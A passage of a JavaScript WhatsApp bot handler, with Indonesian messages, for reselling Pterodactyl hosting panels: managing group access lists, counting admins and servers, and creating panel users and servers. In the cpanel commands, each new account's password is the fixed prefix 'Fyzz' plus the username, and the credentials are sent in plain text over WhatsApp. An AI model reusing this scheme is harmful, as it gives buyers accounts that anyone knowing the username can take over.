 fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

 Reply(`✅ *Berhasil menambahkan akses ke grup!*\n🆔: ${grupId}`);
}
break

//=========================================//

case "addakses": {
 if (!isCreator) return Reply(mess.owner);

 const fs = require('fs');
 const filePath = './library/database/idgrup.json';

 // Pastikan data grup tersedia
 let allChats = await conn.groupFetchAllParticipating();
 let groups = Object.entries(allChats).map(([jid, data]) => ({
 id: jid,
 name: data.subject || 'Tanpa Nama',
 }));

 if (!groups.length) return Reply("❌ Bot tidak ada di grup manapun.");

 // Simpan grup sementara di cache global
 global.cacheGrupAkses = {};
 let sections = [
 {
 title: '🛡️ Pilih Grup Untuk Diberi Akses',
 rows: groups.map((g, i) => {
 global.cacheGrupAkses[`akses_${i}`] = g.id;
 return {
 title: g.name,
 description: g.id,
 id: `.aksesgrp akses_${i}`
 };
 })
 }
 ];

 await conn.sendMessage(m.chat, {
 caption: "Silakan pilih grup yang ingin diberi akses:",
 image: { url: global.image.reply },
 footer: `© ${botname} 2025`,
 buttons: [
 {
 buttonId: 'pilih_grup_akses',
 buttonText: { displayText: '📂 Pilih Grup' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '📌 Pilih Grup Akses',
 sections
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: m });
}
break

//=========================================//

case "delaksesgrp-v2": {
 if (!isCreator) return Reply(mess.owner);

 const fs = require('fs');
 const filePath = './library/database/idgrup2.json';

 if (!args[0]) return Reply("❌ ID grup tidak ditemukan.");
 let grupId = global.cacheGrupAkses?.[args[0]];

 if (!grupId) return Reply("❌ Grup tidak ditemukan dalam cache.");

 // Baca data lama
 let data = [];
 if (fs.existsSync(filePath)) {
 try {
 data = JSON.parse(fs.readFileSync(filePath));
 } catch (e) {
 data = [];
 }
 }

 if (!data.includes(grupId)) return Reply("⚠️ Grup ini belum memiliki akses.");

 // Hapus grup dari data
 data = data.filter(id => id !== grupId);

 // Simpan kembali ke file
 fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

 Reply(`✅ *Berhasil menghapus akses grup!*\n🆔: ${grupId}`);
}
break

//=========================================//

case "delakses-v2": {
 if (!isCreator) return Reply(mess.owner);

 const fs = require('fs');
 const filePath = './library/database/idgrup2.json';

 // Baca file akses
 let data = [];
 if (fs.existsSync(filePath)) {
 try {
 data = JSON.parse(fs.readFileSync(filePath));
 } catch (e) {
 data = [];
 }
 }

 if (!data.length) return Reply("❌ Tidak ada grup yang memiliki akses.");

 // Ambil semua grup yang bot ikuti
 let allChats = await conn.groupFetchAllParticipating();
 let groups = data.map((id) => {
 let info = allChats[id];
 return {
 id,
 name: info?.subject || 'Grup Tidak Dikenal',
 };
 });

 // Simpan grup ke cache untuk digunakan di command .delaksesgrp-v2
 global.cacheGrupAkses = {};
 let sections = [
 {
 title: '🛑 Pilih Grup Untuk Dicabut Akses',
 rows: groups.map((g, i) => {
 global.cacheGrupAkses[`akses_${i}`] = g.id;
 return {
 title: g.name,
 description: g.id,
 id: `.delaksesgrp-v2 akses_${i}`
 };
 })
 }
 ];

 await conn.sendMessage(m.chat, {
 caption: "Silakan pilih grup yang ingin dicabut aksesnya:",
 image: { url: global.image.reply },
 footer: `© ${botname} 2025`,
 buttons: [
 {
 buttonId: 'pilih_grup_hapus',
 buttonText: { displayText: '🗑️ Pilih Grup' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '🗂️ Hapus Akses Grup',
 sections
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: m });
}
break

//=========================================//

case "delaksesgrp": {
 if (!isCreator) return Reply(mess.owner);

 const fs = require('fs');
 const filePath = './library/database/idgrup.json';

 if (!args[0]) return Reply("❌ ID grup tidak ditemukan.");
 let grupId = global.cacheGrupAkses?.[args[0]];

 if (!grupId) return Reply("❌ Grup tidak ditemukan dalam cache.");

 // Baca data lama
 let data = [];
 if (fs.existsSync(filePath)) {
 try {
 data = JSON.parse(fs.readFileSync(filePath));
 } catch (e) {
 data = [];
 }
 }

 if (!data.includes(grupId)) return Reply("⚠️ Grup ini belum memiliki akses.");

 // Hapus grup dari data
 data = data.filter(id => id !== grupId);

 // Simpan kembali ke file
 fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

 Reply(`✅ *Berhasil menghapus akses grup!*\n🆔: ${grupId}`);
}
break

//=========================================//

case "delakses": {
 if (!isCreator) return Reply(mess.owner);

 const fs = require('fs');
 const filePath = './library/database/idgrup.json';

 // Baca file akses
 let data = [];
 if (fs.existsSync(filePath)) {
 try {
 data = JSON.parse(fs.readFileSync(filePath));
 } catch (e) {
 data = [];
 }
 }

 if (!data.length) return Reply("❌ Tidak ada grup yang memiliki akses.");

 // Ambil semua grup yang bot ikuti
 let allChats = await conn.groupFetchAllParticipating();
 let groups = data.map((id) => {
 let info = allChats[id];
 return {
 id,
 name: info?.subject || 'Grup Tidak Dikenal',
 };
 });

 // Simpan grup ke cache untuk digunakan di command .delaksesgrp
 global.cacheGrupAkses = {};
 let sections = [
 {
 title: '🛑 Pilih Grup Untuk Dicabut Akses',
 rows: groups.map((g, i) => {
 global.cacheGrupAkses[`akses_${i}`] = g.id;
 return {
 title: g.name,
 description: g.id,
 id: `.delaksesgrp akses_${i}`
 };
 })
 }
 ];

 await conn.sendMessage(m.chat, {
 caption: "Silakan pilih grup yang ingin dicabut aksesnya:",
 image: { url: global.image.reply },
 footer: `© ${botname} 2025`,
 buttons: [
 {
 buttonId: 'pilih_grup_hapus',
 buttonText: { displayText: '🗑️ Pilih Grup' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '🗂️ Hapus Akses Grup',
 sections
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: m });
}
break

//=========================================//

case "resetreseller-v2": {
    if (!isCreator) return Reply(mess.owner)
    if (!m.isGroup) return Reply(mess.group)
    
    // Kosongkan array tanpa menugaskan ulang
    pler.length = 0
    fs.writeFileSync('./library/database/idgrup2.json', JSON.stringify(pler, null, 2))
    
    Reply(`*${command} Sukses Menghapus Semua Akses Grup✅*`)
}
break

//=========================================//

case "listreseller2": {
    if (!isCreator) return Reply(mess.owner)

    const groupList = JSON.parse(fs.readFileSync('./library/database/idgrup2.json'))
    if (groupList.length === 0) return Reply('📭 *Belum ada grup yang terdaftar.*')

    let text = '*📋 Daftar Group Terdaftar:*\n\n'
    let totalAnggota = 0

    for (let i = 0; i < groupList.length; i++) {
        try {
            let metadata = await conn.groupMetadata(groupList[i])
            let nama = metadata.subject || "Tidak diketahui"
            let anggota = metadata.participants.length || 0
            totalAnggota += anggota

            text += `${i + 1}. ${nama}\n`
            text += `   🆔 ${groupList[i]}\n`
            text += `   👥 Member: ${anggota}\n\n`
        } catch (e) {
            text += `${i + 1}. [❌ Gagal ambil info grup: ${groupList[i]}]\n\n`
        }
    }

    text += `━━━━━━━━━━━━━━\n📊 *Total Grup:* ${groupList.length}\n👥 *Total Member:* ${totalAnggota}`

    Reply(text)
}
break

//=========================================//

case "resetreseller": {
    if (!isCreator) return Reply(mess.owner)
    if (!m.isGroup) return Reply(mess.group)
    
    // Kosongkan array tanpa menugaskan ulang
    pler.length = 0
    fs.writeFileSync('./library/database/idgrup.json', JSON.stringify(pler, null, 2))
    
    Reply(`*${command} Sukses Menghapus Semua Akses Grup✅*`)
}
break

//=========================================//

case "listreseller": {
    if (!isCreator) return Reply(mess.owner)

    const groupList = JSON.parse(fs.readFileSync('./library/database/idgrup.json'))
    if (groupList.length === 0) return Reply('📭 *Belum ada grup yang terdaftar.*')

    let text = '*📋 Daftar Group Terdaftar:*\n\n'
    let totalAnggota = 0

    for (let i = 0; i < groupList.length; i++) {
        try {
            let metadata = await conn.groupMetadata(groupList[i])
            let nama = metadata.subject || "Tidak diketahui"
            let anggota = metadata.participants.length || 0
            totalAnggota += anggota

            text += `${i + 1}. ${nama}\n`
            text += `   🆔 ${groupList[i]}\n`
            text += `   👥 Member: ${anggota}\n\n`
        } catch (e) {
            text += `${i + 1}. [❌ Gagal ambil info grup: ${groupList[i]}]\n\n`
        }
    }

    text += `━━━━━━━━━━━━━━\n📊 *Total Grup:* ${groupList.length}\n👥 *Total Member:* ${totalAnggota}`

    Reply(text)
}
break

//=========================================//

case "totaladmin-v2": {
    if (!isCreator) return Reply(mess.owner)
    
    let cek = await fetch(domainV2 + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    })
    
    let res2 = await cek.json();
    let users = res2.data;
    
    if (users.length < 1) return m.reply("Tidak ada admin panel")
    
    // Menghitung total admin
    let totalAdmin = users.filter(user => user.attributes.root_admin === true).length;

    let teks = `*乂 Total Admin Panel Pterodactyl 2*\n\nTotal Admin 2: ${totalAdmin}`

    await conn.sendMessage(m.chat, {
        text: teks,
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        buttons: [
            { buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel 2' }, type: 1 },
            { buttonId: `.listadmin-v2`, buttonText: { displayText: 'Lihat Semua Admin 2' }, type: 1 }
        ],
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        },
    }, {quoted: m})
}
break;

//=========================================//

case "totaladmin": {
    if (!isCreator) return Reply(mess.owner)
    
    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    
    let res2 = await cek.json();
    let users = res2.data;
    
    if (users.length < 1) return m.reply("Tidak ada admin panel")
    
    // Menghitung total admin
    let totalAdmin = users.filter(user => user.attributes.root_admin === true).length;

    let teks = `*乂 Total Admin Panel Pterodactyl 1*\n\nTotal Admin 1: ${totalAdmin}`

    await conn.sendMessage(m.chat, {
        text: teks,
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        buttons: [
            { buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel 1' }, type: 1 },
            { buttonId: `.listadmin`, buttonText: { displayText: 'Lihat Semua Admin 1' }, type: 1 }
        ],
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        },
    }, {quoted: m})
}
break;

//=========================================//

case "totalpanel-v2": {  
    if (!isCreator) return Reply(mess.owner);  
    let f = await fetch(domainV2 + "/api/application/servers?page=1", {  
        "method": "GET",  
        "headers": {  
            "Accept": "application/json",  
            "Content-Type": "application/json",  
            "Authorization": "Bearer " + apikeyV2  
        }  
    });  
    let res = await f.json();  
    let totalServers = res.meta.pagination.total; // Mengambil total jumlah server  

    await conn.sendMessage(m.chat, {  
        text: `Total Server Panel 2: *${totalServers}*`,  
        footer: `© 2025 ${botname}`,  
        headerType: 1,  
        viewOnce: true,  
        buttons: [
            { buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel 2' }, type: 1 },
            { buttonId: `.delallserver-v2`, buttonText: { displayText: 'Hapus All Server Panel 2' }, type: 1 }
        ],
        contextInfo: {  
            isForwarded: true,   
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"],   
        },  
    }, {quoted: m});  
}  
break;

//=========================================//

case "totalpanel": {  
    if (!isCreator) return Reply(mess.owner);  
    let f = await fetch(domain + "/api/application/servers?page=1", {  
        "method": "GET",  
        "headers": {  
            "Accept": "application/json",  
            "Content-Type": "application/json",  
            "Authorization": "Bearer " + apikey  
        }  
    });  
    let res = await f.json();  
    let totalServers = res.meta.pagination.total; // Mengambil total jumlah server  

    await conn.sendMessage(m.chat, {  
        text: `Total Server Panel 1: *${totalServers}*`,  
        footer: `© 2025 ${botname}`,  
        headerType: 1,  
        viewOnce: true,  
        buttons: [
            { buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel 1' }, type: 1 },
            { buttonId: `.delallserver`, buttonText: { displayText: 'Hapus All Server Panel 1' }, type: 1 }
        ],
        contextInfo: {  
            isForwarded: true,   
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"],   
        },  
    }, {quoted: m});  
}  
break;

//=========================================//

case "createserver": case "csrv": {
  try {
    if (!isCreator && !jangan) return Reply(mess.owner)
    if (!text) return m.reply("Contoh: .csrv username,server,ram")

    let [userquery, namesrv, ramopt] = text.split(",").map(a => a.trim())
    if (!userquery || !namesrv || !ramopt) return m.reply("Format salah! Contoh: .csrv username,server,2gb")

    ramopt = ramopt.toLowerCase()

    // Atur spesifikasi RAM, Disk, dan CPU sesuai pilihan
    let ram, disknya, cpu
    if (ramopt == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
    else if (ramopt == "2gb") { ram="2000"; disknya="2000"; cpu="60" }
    else if (ramopt == "3gb") { ram="3000"; disknya="3000"; cpu="80" }
    else if (ramopt == "4gb") { ram="4000"; disknya="4000"; cpu="100" }
    else if (ramopt == "5gb") { ram="5000"; disknya="5000"; cpu="120" }
    else if (ramopt == "6gb") { ram="6000"; disknya="6000"; cpu="140" }
    else if (ramopt == "7gb") { ram="7000"; disknya="7000"; cpu="160" }
    else if (ramopt == "8gb") { ram="8000"; disknya="8000"; cpu="180" }
    else if (ramopt == "9gb") { ram="9000"; disknya="9000"; cpu="200" }
    else if (ramopt == "10gb") { ram="10000"; disknya="10000"; cpu="220" }
    else if (ramopt == "unli" || ramopt == "unlimited") { ram="0"; disknya="0"; cpu="0" }
    else return m.reply("❌ Pilihan RAM tidak valid! Pilih antara 1GB sampai 10GB atau 'unlimited'.")

    // Cari user (loop page)
    let user = null
    let page = 1
    while (true) {
      let fUser = await fetch(`${domain}/api/application/users?page=${page}&per_page=100`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikey
        }
      })
      let dataUser = await fUser.json()
      if (!dataUser.data || dataUser.data.length == 0) break

      user = dataUser.data.find(u => 
        u.attributes.username.toLowerCase() === userquery.toLowerCase() ||
        u.attributes.email.toLowerCase() === userquery.toLowerCase()
      )
      if (user) break
      page++
    }

    if (!user) return m.reply(`❌ User '${userquery}' tidak ditemukan di panel.`)

    let usr_id = user.attributes.id
    console.log("Ditemukan user id:", usr_id, "username:", user.attributes.username, "email:", user.attributes.email)

    let desc = tanggal(Date.now())

    // Ambil startup cmd
    let f1 = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      }
    })
    let data2 = await f1.json()
    let startup_cmd = data2.attributes.startup

    // Buat server
    let f2 = await fetch(domain + "/api/application/servers", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      },
      body: JSON.stringify({
        name: namesrv,
        description: desc,
        user: usr_id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
        startup: startup_cmd,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start"
        },
        limits: {
          memory: ram,
          swap: 0,
          disk: disknya,
          io: 500,
          cpu: cpu
        },
        feature_limits: { databases: 5, backups: 5, allocations: 5 },
        deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] }
      })
    })

    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    let teks = `✅ *Berhasil membuat server!*

📡 *ID Server:* ${server.id}
🖥 *Nama:* ${namesrv}
👤 *Untuk user:* ${user.attributes.username} (${user.attributes.email})

🌐 *Spesifikasi:*
• RAM: ${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}
• Disk: ${disknya == "0" ? "Unlimited" : disknya / 1000 + "GB"}
• CPU: ${cpu == "0" ? "Unlimited" : cpu + "%"}

🌍 ${global.domain}`

    await m.reply(teks)

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

//=========================================//

case "createserver2": case "csrv2": {
  try {
    if (!isCreator && !jangan) return Reply(mess.owner)
    if (!text) return m.reply("Contoh: .csrv2 username,server,ram")

    let [userquery, namesrv, ramopt] = text.split(",").map(a => a.trim())
    if (!userquery || !namesrv || !ramopt) return m.reply("Format salah! Contoh: .csrv2 username,server,2gb")

    ramopt = ramopt.toLowerCase()

    // Atur spesifikasi RAM, Disk, dan CPU sesuai pilihan
    let ram, disknya, cpu
    if (ramopt == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
    else if (ramopt == "2gb") { ram="2000"; disknya="2000"; cpu="60" }
    else if (ramopt == "3gb") { ram="3000"; disknya="3000"; cpu="80" }
    else if (ramopt == "4gb") { ram="4000"; disknya="4000"; cpu="100" }
    else if (ramopt == "5gb") { ram="5000"; disknya="5000"; cpu="120" }
    else if (ramopt == "6gb") { ram="6000"; disknya="6000"; cpu="140" }
    else if (ramopt == "7gb") { ram="7000"; disknya="7000"; cpu="160" }
    else if (ramopt == "8gb") { ram="8000"; disknya="8000"; cpu="180" }
    else if (ramopt == "9gb") { ram="9000"; disknya="9000"; cpu="200" }
    else if (ramopt == "10gb") { ram="10000"; disknya="10000"; cpu="220" }
    else if (ramopt == "unli" || ramopt == "unlimited") { ram="0"; disknya="0"; cpu="0" }
    else return m.reply("❌ Pilihan RAM tidak valid! Pilih antara 1GB sampai 10GB atau 'unlimited'.")

    // Cari user (loop page)
    let user = null
    let page = 1
    while (true) {
      let fUser = await fetch(`${domainV2}/api/application/users?page=${page}&per_page=100`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikeyV2
        }
      })
      let dataUser = await fUser.json()
      if (!dataUser.data || dataUser.data.length == 0) break

      user = dataUser.data.find(u => 
        u.attributes.username.toLowerCase() === userquery.toLowerCase() ||
        u.attributes.email.toLowerCase() === userquery.toLowerCase()
      )
      if (user) break
      page++
    }

    if (!user) return m.reply(`❌ User '${userquery}' tidak ditemukan di panel.`)

    let usr_id = user.attributes.id
    console.log("Ditemukan user id:", usr_id, "username:", user.attributes.username, "email:", user.attributes.email)

    let desc = tanggal(Date.now())

    // Ambil startup cmd
    let f1 = await fetch(`${domainV2}/api/application/nests/${nestid}/eggs/${egg}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      }
    })
    let data2 = await f1.json()
    let startup_cmd = data2.attributes.startup

    // Buat server
    let f2 = await fetch(domainV2 + "/api/application/servers", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      },
      body: JSON.stringify({
        name: namesrv,
        description: desc,
        user: usr_id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
        startup: startup_cmd,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start"
        },
        limits: {
          memory: ram,
          swap: 0,
          disk: disknya,
          io: 500,
          cpu: cpu
        },
        feature_limits: { databases: 5, backups: 5, allocations: 5 },
        deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] }
      })
    })

    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    let teks = `✅ *Berhasil membuat server!*

📡 *ID Server:* ${server.id}
🖥 *Nama:* ${namesrv}
👤 *Untuk user:* ${user.attributes.username} (${user.attributes.email})

🌐 *Spesifikasi:*
• RAM: ${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}
• Disk: ${disknya == "0" ? "Unlimited" : disknya / 1000 + "GB"}
• CPU: ${cpu == "0" ? "Unlimited" : cpu + "%"}

🌍 ${global.domainV2}`

    await m.reply(teks)

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

//=========================================//

case "cpanel": {
   if (!isCreator) return Reply(mess.owner);
   if (!text) return m.reply("⚠️ Format salah!\nContoh: .cpanel Username,628xxx");

   let [userpanel, nomor] = text.split(",");
   if (!userpanel || !nomor) return m.reply("⚠️ Format salah!\nContoh: .cpanel Username,628xxx");

   global.sessionPanel = global.sessionPanel || {};
   global.sessionPanel[m.sender] = {
      username: userpanel.trim(),
      nomor: nomor.replace(/[^0-9]/g, ""),
      ram: null
   };

   await conn.sendMessage(m.chat, {
      caption: `🧩 Username: *${userpanel}*\nNomor: *${nomor}*\n\nSilakan pilih RAM untuk akun ini:`,
      image: { url: global.image.reply },
      footer: `${botname2}`,
      buttons: [
        {
          buttonId: 'pilih_ram_panel',
          buttonText: { displayText: '💾 Pilih RAM' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: '💾 Pilih RAM',
              sections: [
                {
                  title: 'Opsi RAM',
                  rows: [
                    { title: 'Unlimited', id: '.pilih-ram unli' },
                    { title: '1GB', id: '.pilih-ram 1gb' },
                    { title: '2GB', id: '.pilih-ram 2gb' },
                    { title: '3GB', id: '.pilih-ram 3gb' },
                    { title: '4GB', id: '.pilih-ram 4gb' },
                    { title: '5GB', id: '.pilih-ram 5gb' },
                    { title: '6GB', id: '.pilih-ram 6gb' },
                    { title: '7GB', id: '.pilih-ram 7gb' },
                    { title: '8GB', id: '.pilih-ram 8gb' },
                    { title: '9GB', id: '.pilih-ram 9gb' },
                    { title: '10GB', id: '.pilih-ram 10gb' }
                  ]
                }
              ]
            })
          }
        }
      ],
      headerType: 1,
      viewOnce: true
   }, { quoted: m });
}
break;


// STEP 2: Pilih RAM
case "pilih-ram": {
   if (!isCreator) return Reply(mess.owner);
   if (!text) return m.reply("⚠️ Contoh: .pilih-ram 2gb");

   let sess = global.sessionPanel?.[m.sender];
   if (!sess) return m.reply("⚠️ Data tidak ditemukan, ulangi `.cpanel Username,628xxx` dulu");

   sess.ram = text.trim().toLowerCase();
   global.sessionPanel[m.sender] = sess;

   await conn.sendMessage(m.chat, {
      caption: `🧩 Username: *${sess.username}*\nNomor: *${sess.nomor}*\nRAM: *${sess.ram.toUpperCase()}*\n\nSekarang pilih server:`,
      image: { url: global.image.reply },
      footer: `${botname2}`,
      buttons: [
        {
          buttonId: 'pilih_server_panel',
          buttonText: { displayText: '🌐 Pilih Server' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: '🛠️ Pilih Server Panel',
              sections: [
                {
                  title: '📁 Buat Admin Panel',
                  rows: [
                    { title: '🌐 Panel Server V1', id: '.cpanel-v1' },
                    { title: '🌐 Panel Server V2', id: '.cpanel-v2' }
                  ]
                }
              ]
            })
          }
        }
      ],
      headerType: 1,
      viewOnce: true
   }, { quoted: m });
}
break;


case "cpanel-v1": {
  if (!isCreator) return Reply(mess.owner);

  global.sessionPanel = global.sessionPanel || {};
  let sess = global.sessionPanel[m.sender];
  if (!sess) return m.reply("⚠️ Data tidak ditemukan, ulangi `.cpanel Username,628xxx` dulu");

  let userpanel = sess.username;
  let targetNumber = sess.nomor;
  let rampanel = sess.ram;

  if (!userpanel || !targetNumber || !rampanel) 
    return m.reply("⚠️ Data belum lengkap, ulangi dari awal!");

  let target = targetNumber + "@s.whatsapp.net";

  // mapping RAM → spec
  const specs = {
    unli: { ram: "0", disk: "0", cpu: "0" },
    "1gb": { ram: "1000", disk: "1000", cpu: "40" },
    "2gb": { ram: "2000", disk: "1000", cpu: "60" },
    "3gb": { ram: "3000", disk: "2000", cpu: "80" },
    "4gb": { ram: "4000", disk: "2000", cpu: "100" },
    "5gb": { ram: "5000", disk: "3000", cpu: "120" },
    "6gb": { ram: "6000", disk: "3000", cpu: "140" },
    "7gb": { ram: "7000", disk: "4000", cpu: "160" },
    "8gb": { ram: "8000", disk: "4000", cpu: "180" },
    "9gb": { ram: "9000", disk: "5000", cpu: "200" },
    "10gb": { ram: "10000", disk: "5000", cpu: "220" }
  };

  let spec = specs[rampanel] || specs["1gb"];
  let ram = spec.ram, disknya = spec.disk, cpu = spec.cpu;

  try {
    // --- CREATE USER PTERODACTYL ---
    let username = userpanel;
    let email = username + "@Fyzz.com";
    let name = capital(username) + "Fyzz-Server";
    let password = "Fyzz" + userpanel;

    let f = await fetch(domain + "/api/application/users", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      },
      body: JSON.stringify({
        email,
        username,
        first_name: name,
        last_name: "Server",
        language: "en",
        password: password.toString()
      })
    });
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let usr_id = user.id;

    // --- GET STARTUP COMMAND ---
    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/${egg}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      }
    });
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup;

    // --- CREATE SERVER ---
    let f2 = await fetch(domain + "/api/application/servers", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      },
      body: JSON.stringify({
        name,
        description: "Thanks For Buying",
        user: usr_id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
        startup: startup_cmd,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start"
        },
        limits: {
          memory: ram,
          swap: 0,
          disk: disknya,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 5
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    let result = await f2.json();
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2));
    let server = result.attributes;

    await m.reply("*Berhasil membuat akun Panel✅*");

    // --- KIRIM HASIL KE TARGET ---
    const { generateWAMessageFromContent, generateWAMessageContent, proto } = require('@whiskeysockets/baileys');
    const fs = require("fs");

    var teks = `🖲️ *Pterodactyl Panel*
*About Panel Spec*
📡 *ID:* ${server.id}
⚙️ *RAM:* ${ram == "0" ? "Unlimited" : ram}
💾 *CPU:* ${cpu == "0" ? "Unlimited" : cpu + "%"}
🗄 *DISK:* ${disknya == "0" ? "Unlimited" : disknya}
🖥 *WEB:* ${global.domain}

👤 *User:* ${user.username}
🔐 *Pass:* ${password}`;

    let thumb = fs.readFileSync("./media/reply.jpg");
    let imgMsg = await generateWAMessageContent({ image: thumb }, { upload: conn.waUploadToServer });

    let msgii = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            header: proto.Message.InteractiveMessage.Header.create({
              title: `CPANEL RAM ${rampanel.toUpperCase()} ✅`,
              hasMediaAttachment: true,
              imageMessage: imgMsg.imageMessage
            }),
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "🌐 Login Server Panel", url: global.domain }) },
                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "👤 Copy Username", copy_code: `${user.username}` }) },
                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "🔐 Copy Password", copy_code: `${password}` }) },
                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Ada Masalah ❓", url: "https://wa.me/6281313532320" }) }
              ]
            })
          })
        }
      }
    }, { userJid: target, quoted: m });

    await conn.relayMessage(target, msgii.message, { messageId: msgii.key.id });

    // hapus session biar ga numpuk
    delete global.sessionPanel[m.sender];

  } catch (err) {
    delete global.sessionPanel[m.sender];
    console.error(err);
    return m.reply("Terjadi error saat membuat server: " + (err.message || err));
  }
}
break;

case "cpanel-v2": {
  if (!isCreator) return Reply(mess.owner);

  global.sessionPanel = global.sessionPanel || {};
  let sess = global.sessionPanel[m.sender];
  if (!sess) return m.reply("⚠️ Data tidak ditemukan, ulangi `.cpanel Username,628xxx` dulu");

  let userpanel = sess.username;
  let targetNumber = sess.nomor;
  let rampanel = sess.ram;

  if (!userpanel || !targetNumber || !rampanel) 
    return m.reply("⚠️ Data belum lengkap, ulangi dari awal!");

  let target = targetNumber + "@s.whatsapp.net";

  // mapping RAM → spec
  const specs = {
    unli: { ram: "0", disk: "0", cpu: "0" },
    "1gb": { ram: "1000", disk: "1000", cpu: "40" },
    "2gb": { ram: "2000", disk: "1000", cpu: "60" },
    "3gb": { ram: "3000", disk: "2000", cpu: "80" },
    "4gb": { ram: "4000", disk: "2000", cpu: "100" },
    "5gb": { ram: "5000", disk: "3000", cpu: "120" },
    "6gb": { ram: "6000", disk: "3000", cpu: "140" },
    "7gb": { ram: "7000", disk: "4000", cpu: "160" },
    "8gb": { ram: "8000", disk: "4000", cpu: "180" },
    "9gb": { ram: "9000", disk: "5000", cpu: "200" },
    "10gb": { ram: "10000", disk: "5000", cpu: "220" }
  };

  let spec = specs[rampanel] || specs["1gb"];
  let ram = spec.ram, disknya = spec.disk, cpu = spec.cpu;

  try {
    // --- CREATE USER PTERODACTYL ---
    let username = userpanel;
    let email = username + "@Fyzz.com";
    let name = capital(username) + "Fyzz-Server";
    let password = "Fyzz" + userpanel;

    let f = await fetch(domainV2 + "/api/application/users", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
